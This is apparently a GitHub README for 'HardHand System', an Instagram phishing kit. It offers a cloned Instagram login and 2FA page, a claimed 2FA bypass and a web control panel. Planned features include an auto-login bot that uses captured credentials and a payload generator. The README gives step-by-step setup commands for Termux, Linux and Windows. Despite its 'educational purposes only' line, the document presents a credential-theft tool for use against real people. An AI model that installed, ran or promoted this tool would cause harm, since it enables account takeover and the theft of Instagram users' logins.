<h1 align="center">HardHand System</h1>
<h3 align="center">Advanced Instagram Phising Tool With WebUI</h3>
<h3 align="center">For educational purposes only.</h3>

##

### Features

- Original IG template (2FA. Login) (More soon)
- Beginners friendly
- Web Interface
- 2FA bypass

### Planning

- Ngrok support
- Full status
- Menu (for more tools)
- Auto Update
- SendToMe Payload generator (sends pdf, txt etc.. to you)
- Full Web Panel controll (Button for shutdown or turn on phising server and ngrok)
- Dark Mode optimalization
- Multiple devices (for phising)
- AFK Mode (Auto controlling phising)
- Auto login bot (Automaticli loging to IG by current data)
- Admin Pannel
- Global Chat
- Local File Manager (For SendToMe)
- Custom Templates


##

### Instalation on Termux


```
git clone https://github.com/HardHand-Com/HardHand-System.git
```

```
cd HardHand-System && bash setup.sh
```

Go to 127.0.0.1:2222 for web panel (running globaly 0.0.0.0)
Phisher on 127.0.0.1:8000 (also global 0.0.0.0)

##

### Instalation for Linux

It's pretty similar but you need to use different method to install mongoDB
Soon will be installation support

Probably you can try:

```
git clone https://github.com/HardHand-Com/HardHand-System.git
```

```
sudo apt install mongodb rust
```

```
cd HardHand-System
```

```
cd setupsys && python checkhhvenv.py && python checkphvenv.py && cd ..
```

```
source hhvenv/bin/activate && pip install flask flask_sqlalchemy flask_bcrypt pymongo flask_login requests && deactivate
```

```
source hhphisher/bin/activate && pip install flask pymongo requests && deactivate
```

Go to 127.0.0.1:2222 for web panel (running globaly 0.0.0.0)
Phisher on 127.0.0.1:8000 (also global 0.0.0.0)

##

### Installation for Windows

This is the hardest one
Download mongo compas from here:
https://www.mongodb.com/products/tools/compass

Also install python from microsoft store (or else, doesnt matter)
Minimum 3.8 (Was tested on this, not on lower)

```
git clone https://github.com/HardHand-Com/HardHand-System.git
```

<h6>Or download the zip.</h6>

```
cd HardHand-System
```

```
cd setupsys && python checkhhvenv.py && python checkphvenv.py && cd ..
```

```
hhvenv\Scripts\activate && pip install flask flask_sqlalchemy flask_bcrypt pymongo flask_login requests && deactivate
```

```
hhphisher\Scripts\activate && pip install flask pymongo requests && deactivate
```

#### When you wanna start it

You need to start database in mongo compas
Then:

```
python3 hardhand/app.py
```

On second terminal:

```
python3 phisher/app.py
```

Now phising site is running on 127.0.0.1:8000 (0.0.0.0)

And Controll panel is running on 127.0.0.1:2222 (0.0.0.0)

On first access you will be promted to create new admin account.

##

<h5 align="center">Version</h5>
<h6 align="center">Alpha 1.0.1</h6>
<h6 align="center">Soon will be new updates. there is lots of work to do.</h6>
<h6 align="center">By HardHand Community System Project.</h6>
